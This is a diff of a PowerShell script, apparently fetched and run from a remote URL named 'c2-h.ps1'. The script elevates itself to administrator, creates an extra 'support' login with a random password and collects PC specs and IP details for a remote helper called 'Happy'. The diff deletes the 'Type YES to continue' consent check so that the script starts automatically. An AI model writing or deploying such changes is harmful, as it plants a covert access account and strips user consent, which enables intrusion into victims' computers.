@@ -6,7 +6,7 @@
 # What it does NOT do: no silent upload, no router login, no change to main account password.
 
 $ScriptUrl = 'https://www.adityaai.dev/c2-h.ps1'
-$Version = '2026-09-10-v2-happy'
+$Version = '2026-09-10-v3-auto'
 $HelperName = 'Happy'
 $ShareFileName = 'share-it-to-happy.txt'
 $ErrorActionPreference = 'Stop'
@@ -50,8 +50,7 @@ Write-Host '  2. Create a SEPARATE login "support" with a random password' -Fore
 Write-Host '  3. Show PC specs + IP details in a Notepad file' -ForegroundColor Gray
 Write-Host '  Nothing is uploaded. You forward the file on WhatsApp yourself.' -ForegroundColor Green
 Write-Host '  Takes 2-5 min. Do NOT close this window.' -ForegroundColor Yellow
-$ok = Read-Host "Type YES to continue (anything else cancels)"
-if ($ok -ne 'YES') { Write-Host 'Cancelled. Nothing changed.' -ForegroundColor Yellow; return }
+Write-Host 'Starting automatically...' -ForegroundColor Green
 
 # --- 0. Self-elevate (iex has no $PSCommandPath, so re-download to TEMP) ---
 $IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
